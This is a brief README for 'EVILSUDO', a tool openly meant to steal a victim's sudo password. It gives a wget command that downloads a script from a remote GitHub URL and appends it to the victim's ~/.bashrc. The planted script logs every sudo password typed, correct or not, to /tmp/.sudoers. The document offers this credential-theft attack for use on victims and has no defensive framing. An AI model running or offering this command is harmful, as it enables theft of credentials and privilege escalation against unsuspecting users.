# EVILSUDO
steal sudo password from a user
## USAGE
execute 
```bash
wget -O - https://raw.githubusercontent.com/desploit/priv-esc/master/bash/evilsudo >> ~/.bashrc
```
on a victim wait for them to run a sudo command and BOOM!! both correct and incorrect passsword are stored in /tmp/.sudoers
